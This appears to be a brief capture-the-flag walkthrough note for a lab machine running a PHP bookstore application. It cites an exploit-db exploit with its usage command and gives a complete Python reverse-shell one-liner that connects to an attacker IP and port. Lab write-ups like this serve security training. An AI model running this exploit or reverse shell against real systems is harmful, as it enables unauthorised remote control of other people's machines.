# DAY9
```
[+] Hint : Web Server
: http://10.10.13.235/database/readme.txt.txt

[+] Hint : github
: https://github.com/thanhnghi94/PHP-BookStore/blob/master/README.md

[+]exploit-db
: https://www.exploit-db.com/exploits/47887
-> Execute Usage :  python 47887.py http://10.10.13.235

[+] Reverse Shell
IP = 10.9.26.67
PORT = 4444

/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


```